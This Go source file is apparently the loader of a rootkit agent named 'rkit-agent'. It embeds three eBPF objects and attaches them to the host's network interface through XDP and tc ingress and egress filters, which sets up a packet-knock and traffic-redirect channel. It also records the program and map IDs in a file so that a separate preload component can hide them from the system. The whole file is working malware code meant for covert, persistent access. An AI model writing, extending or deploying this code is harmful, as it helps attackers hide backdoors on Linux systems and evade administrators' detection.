package main

import (
	"bytes"
	_ "embed"
	"fmt"
	"net"
	"os"
	"os/exec"
	"path/filepath"

	"github.com/cilium/ebpf"
	"github.com/cilium/ebpf/link"
	"github.com/cilium/ebpf/rlimit"
)

//go:embed bpf/ip_check.bpf.o
var ipCheckEmbed []byte

//go:embed bpf/ingress_redirect.bpf.o
var ingressRedirectEmbed []byte

//go:embed bpf/egress_restore.bpf.o
var egressRestoreEmbed []byte

// bpfHold keeps BPF collections and links alive (knock only; hide via preload).
type bpfHold struct {
	knockColls []*ebpf.Collection
	knockLinks []link.Link
}

// Set by run() for signal-handler cleanup.
var cleanupIface string
var cleanupHold *bpfHold

func writeBpfHideIds(colls []*ebpf.Collection) {
	if err := os.MkdirAll(filepath.Dir(bpfHideIdsFile), 0700); err != nil {
		return
	}
	f, err := os.Create(bpfHideIdsFile)
	if err != nil {
		return
	}
	defer f.Close()
	for _, c := range colls {
		if c == nil {
			continue
		}
		for _, prog := range c.Programs {
			info, err := prog.Info()
			if err != nil {
				continue
			}
			id, ok := info.ID()
			if !ok {
				continue
			}
			fmt.Fprintf(f, "p %d\n", id)
		}
		for _, m := range c.Maps {
			info, err := m.Info()
			if err != nil {
				continue
			}
			id, ok := info.ID()
			if !ok {
				continue
			}
			fmt.Fprintf(f, "m %d\n", id)
		}
	}
}

func loadBpf() (*bpfHold, error) {
	if err := rlimit.RemoveMemlock(); err != nil {
		return nil, err
	}

	knockColls, knockLinks, err := loadKnockAndAttach()
	if err != nil {
		fmt.Fprintf(os.Stderr, "rkit-agent: knock (optional): %v\n", err)
		knockColls, knockLinks = nil, nil
	}

	if len(knockColls) > 0 {
		writeBpfHideIds(knockColls)
	}

	return &bpfHold{
		knockColls: knockColls,
		knockLinks: knockLinks,
	}, nil
}

// defaultIfaceName returns the first non-loopback interface, or "eth0" if none found (e.g. VM uses enp0s3, ens3).
func defaultIfaceName() string {
	if iface, err := net.InterfaceByName("eth0"); err == nil && iface.Flags&net.FlagLoopback == 0 {
		return "eth0"
	}
	ifaces, err := net.Interfaces()
	if err != nil {
		return "eth0"
	}
	for _, iface := range ifaces {
		if iface.Flags&net.FlagLoopback != 0 || iface.Flags&net.FlagUp == 0 {
			continue
		}
		return iface.Name
	}
	return "eth0"
}

func loadKnockAndAttach() ([]*ebpf.Collection, []link.Link, error) {
	ifaceName := os.Getenv("RKIT_IFACE")
	if ifaceName == "" {
		ifaceName = defaultIfaceName()
	}
	iface, err := net.InterfaceByName(ifaceName)
	if err != nil {
		return nil, nil, fmt.Errorf("interface %s: %w", ifaceName, err)
	}
	cleanupIface = ifaceName

	spec1, err := ebpf.LoadCollectionSpecFromReader(bytes.NewReader(ipCheckEmbed))
	if err != nil {
		return nil, nil, fmt.Errorf("load ip_check spec: %w", err)
	}
	coll1, err := ebpf.NewCollection(spec1)
	if err != nil {
		return nil, nil, fmt.Errorf("load ip_check: %w", err)
	}
	filterMap := coll1.Maps["filter_map"]
	if filterMap == nil {
		coll1.Close()
		return nil, nil, fmt.Errorf("ip_check: filter_map not found")
	}
	var xdpProg *ebpf.Program
	for _, p := range coll1.Programs {
		xdpProg = p
		break
	}
	if xdpProg == nil {
		coll1.Close()
		return nil, nil, fmt.Errorf("ip_check: no program")
	}

	spec2, err := ebpf.LoadCollectionSpecFromReader(bytes.NewReader(ingressRedirectEmbed))
	if err != nil {
		coll1.Close()
		return nil, nil, fmt.Errorf("load ingress_redirect spec: %w", err)
	}
	coll2, err := ebpf.NewCollectionWithOptions(spec2, ebpf.CollectionOptions{
		MapReplacements: map[string]*ebpf.Map{"filter_map": filterMap},
	})
	if err != nil {
		coll1.Close()
		return nil, nil, fmt.Errorf("load ingress_redirect: %w", err)
	}
	flowMap := coll2.Maps["flow_map"]
	if flowMap == nil {
		coll1.Close()
		coll2.Close()
		return nil, nil, fmt.Errorf("ingress_redirect: flow_map not found")
	}
	var ingressProg *ebpf.Program
	for _, p := range coll2.Programs {
		ingressProg = p
		break
	}
	if ingressProg == nil {
		coll1.Close()
		coll2.Close()
		return nil, nil, fmt.Errorf("ingress_redirect: no program")
	}

	spec3, err := ebpf.LoadCollectionSpecFromReader(bytes.NewReader(egressRestoreEmbed))
	if err != nil {
		coll1.Close()
		coll2.Close()
		return nil, nil, fmt.Errorf("load egress_restore spec: %w", err)
	}
	coll3, err := ebpf.NewCollectionWithOptions(spec3, ebpf.CollectionOptions{
		MapReplacements: map[string]*ebpf.Map{"filter_map": filterMap, "flow_map": flowMap},
	})
	if err != nil {
		coll1.Close()
		coll2.Close()
		return nil, nil, fmt.Errorf("load egress_restore: %w", err)
	}
	var egressProg *ebpf.Program
	for _, p := range coll3.Programs {
		egressProg = p
		break
	}
	if egressProg == nil {
		coll1.Close()
		coll2.Close()
		coll3.Close()
		return nil, nil, fmt.Errorf("egress_restore: no program")
	}

	xdpLink, err := link.AttachXDP(link.XDPOptions{
		Program:   xdpProg,
		Interface: iface.Index,
	})
	if err != nil {
		coll1.Close()
		coll2.Close()
		coll3.Close()
		return nil, nil, fmt.Errorf("attach XDP: %w", err)
	}

	if err := os.MkdirAll(bpffsFire, 0755); err != nil {
		xdpLink.Close()
		coll1.Close()
		coll2.Close()
		coll3.Close()
		return nil, nil, fmt.Errorf("mkdir %s: %w", bpffsFire, err)
	}
	pinIngress := filepath.Join(bpffsFire, "tc_ingress")
	pinEgress := filepath.Join(bpffsFire, "tc_egress")
	if err := ingressProg.Pin(pinIngress); err != nil {
		xdpLink.Close()
		coll1.Close()
		coll2.Close()
		coll3.Close()
		return nil, nil, fmt.Errorf("pin tc_ingress: %w", err)
	}
	if err := egressProg.Pin(pinEgress); err != nil {
		_ = ingressProg.Unpin()
		xdpLink.Close()
		coll1.Close()
		coll2.Close()
		coll3.Close()
		return nil, nil, fmt.Errorf("pin tc_egress: %w", err)
	}
	if out, err := exec.Command("tc", "qdisc", "replace", "dev", ifaceName, "clsact").CombinedOutput(); err != nil {
		_ = egressProg.Unpin()
		_ = ingressProg.Unpin()
		xdpLink.Close()
		coll1.Close()
		coll2.Close()
		coll3.Close()
		return nil, nil, fmt.Errorf("tc qdisc: %v %s", err, out)
	}
	exec.Command("tc", "filter", "del", "dev", ifaceName, "ingress").Run()
	exec.Command("tc", "filter", "del", "dev", ifaceName, "egress").Run()
	if out, err := exec.Command("tc", "filter", "add", "dev", ifaceName, "ingress", "proto", "all", "prio", "1", "handle", "1", "bpf", "da", "pinned", pinIngress).CombinedOutput(); err != nil {
		_ = egressProg.Unpin()
		_ = ingressProg.Unpin()
		xdpLink.Close()
		coll1.Close()
		coll2.Close()
		coll3.Close()
		return nil, nil, fmt.Errorf("tc ingress: %v %s", err, out)
	}
	if out, err := exec.Command("tc", "filter", "add", "dev", ifaceName, "egress", "proto", "all", "prio", "1", "handle", "1", "bpf", "da", "pinned", pinEgress).CombinedOutput(); err != nil {
		_ = egressProg.Unpin()
		_ = ingressProg.Unpin()
		xdpLink.Close()
		coll1.Close()
		coll2.Close()
		coll3.Close()
		return nil, nil, fmt.Errorf("tc egress: %v %s", err, out)
	}

	return []*ebpf.Collection{coll1, coll2, coll3}, []link.Link{xdpLink}, nil
}
